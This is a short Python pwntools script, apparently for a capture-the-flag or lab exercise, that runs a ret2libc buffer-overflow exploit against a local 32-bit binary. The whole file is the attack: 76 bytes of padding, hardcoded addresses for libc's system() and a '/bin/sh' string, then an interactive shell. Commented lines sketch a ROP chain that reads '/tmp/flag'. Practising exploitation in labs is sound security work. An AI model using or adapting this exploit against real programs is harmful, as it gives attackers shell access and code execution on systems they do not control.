from pwn import *
p = process("./a32.out")

PR = 0xbfc0ffee  # need to change accordingly; PPR, PPPR may also needed
# "pop ret" gagdet is used for cleaning stack, in 32bit system
LIBC = 0xf7c00000
system = 0xf7c4c800
binsh = 0xf7db5faa
payload = b'A' * 76

payload += p32(system)
payload += b'A' * 4
payload += p32(binsh)
# open("/tmp/flag", 0)  #some note for file reading
# read(3, buf, 1048)
# write(1, buf, 1048)

# BUF = 0x804c500
# payload += p32(READ)
# payload += p32(PPPR)
# payload += p32(0)
# payload += p32(BUF)
# payload += p32(len("/tmp/flag"))

# gdb.attach(p, "b *(start+163)")
p.sendline(payload)

#p.recvuntil("blabla") #receive data until one of delims ("blabla") is encountered.
#p.send("/tmp/flag")  # send more info 

p.interactive()

